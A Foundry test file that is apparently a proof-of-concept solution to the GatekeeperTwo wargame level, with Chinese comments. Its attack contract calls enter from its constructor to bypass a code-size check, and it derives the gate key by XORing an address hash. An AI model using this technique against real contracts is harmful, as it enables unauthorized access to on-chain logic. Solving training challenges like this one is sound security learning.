// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwo_POC is Test {
    GatekeeperTwo _gatekeeperTwo;
    function init() private{
        vm.startPrank(address(0x10));
        _gatekeeperTwo = new GatekeeperTwo();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_GatekeeperTwo_POC() public{
        address own= address(tx.origin);
        GatekeeperTwoAttack target = new GatekeeperTwoAttack(address(_gatekeeperTwo));
        console.log("Success:", _gatekeeperTwo.entrant() == own);
    }
}

contract GatekeeperTwoAttack {
    GatekeeperTwo target;

    constructor(address _target) {
        target = GatekeeperTwo(_target);
        
        // 计算符合要求的 gateKey
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        
        // 在构造函数中调用 enter
        target.enter(gateKey);
    }
}